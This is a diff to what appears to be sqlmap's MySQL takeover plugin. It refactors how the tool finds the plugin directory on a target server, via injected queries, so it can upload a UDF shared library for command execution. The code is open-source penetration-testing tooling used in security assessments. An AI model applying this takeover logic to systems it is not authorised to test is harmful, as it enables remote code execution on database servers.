@@ -38,8 +38,8 @@ from plugins.generic.takeover import Takeover as GenericTakeover
 
 class Takeover(GenericTakeover):
     def __init__(self):
-        self.__basedir      = None
-        self.__datadir      = None
+        self.__basedir = None
+        self.__datadir = None
 
         GenericTakeover.__init__(self)
 
@@ -48,51 +48,51 @@ class Takeover(GenericTakeover):
 
         banVer = kb.bannerFp["dbmsVersion"]
 
-        # On Windows
-        if kb.os == "Windows":
-            # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
-            if banVer >= "5.1.19":
-                if self.__basedir is None:
-                    logger.info("retrieving MySQL base directory absolute path")
+        # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
+        if banVer >= "5.1.19":
+            if self.__basedir is None:
+                logger.info("retrieving MySQL base directory absolute path")
 
-                    # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
-                    self.__basedir = inject.getValue("SELECT @@basedir")
-                    self.__basedir = ntToPosixSlashes(normalizePath(self.__basedir))
+                # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
+                self.__basedir = inject.getValue("SELECT @@basedir")
 
-                    if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
-                        kb.os = "Windows"
-
-                # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
-                self.udfRemoteFile = "%s/lib/plugin/%s.%s" % (self.__basedir, self.udfSharedLibName, self.udfSharedLibExt)
-
-                logger.warn("this will only work if the database administrator created manually the '%s/lib/plugin' subfolder" % self.__basedir)
-
-            # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
-            # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
-            else:
-                #logger.debug("retrieving MySQL data directory absolute path")
-
-                # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
-                #self.__datadir = inject.getValue("SELECT @@datadir")
-
-                # NOTE: specifying the relative path as './udf.dll'
-                # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
-                self.__datadir = "."
-                self.__datadir = ntToPosixSlashes(normalizePath(self.__datadir))
-
-                if re.search("[\w]\:\/", self.__datadir, re.I):
+                if re.search("^[\w]\:[\/\\\\]+", self.__basedir, re.I):
                     kb.os = "Windows"
+                else:
+                    kb.os = "Linux"
 
-                # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
-                # C:\WINDOWS\system32, @@basedir\bin or @@datadir
-                self.udfRemoteFile = "%s/%s.%s" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)
+            # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
+            if kb.os == "Windows":
+                self.__basedir += "/lib/plugin"
+            else:
+                self.__basedir += "/lib/mysql/plugin"
 
-        # On Linux
+            self.__basedir = ntToPosixSlashes(normalizePath(self.__basedir))
+            self.udfRemoteFile = "%s/%s.%s" % (self.__basedir, self.udfSharedLibName, self.udfSharedLibExt)
+
+            logger.warn("this will only work if the database administrator created manually the '%s' subfolder" % self.__basedir)
+
+        # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
+        # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
         else:
-            # The SO can be in either /lib, /usr/lib or one of the
-            # paths specified in /etc/ld.so.conf file, none of these
-            # paths are writable by mysql user by default
-            self.udfRemoteFile = "/usr/lib/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
+            #logger.debug("retrieving MySQL data directory absolute path")
+
+            # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
+            #self.__datadir = inject.getValue("SELECT @@datadir")
+
+            # NOTE: specifying the relative path as './udf.dll'
+            # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
+            self.__datadir = "."
+            self.__datadir = ntToPosixSlashes(normalizePath(self.__datadir))
+
+            if re.search("^[\w]\:[\/\\\\]+", self.__datadir, re.I):
+                kb.os = "Windows"
+            else:
+                kb.os = "Linux"
+
+            # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
+            # C:\WINDOWS\system32, @@basedir\bin or @@datadir
+            self.udfRemoteFile = "%s/%s.%s" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)
 
     def udfSetLocalPaths(self):
         self.udfLocalFile     = paths.SQLMAP_UDF_PATH
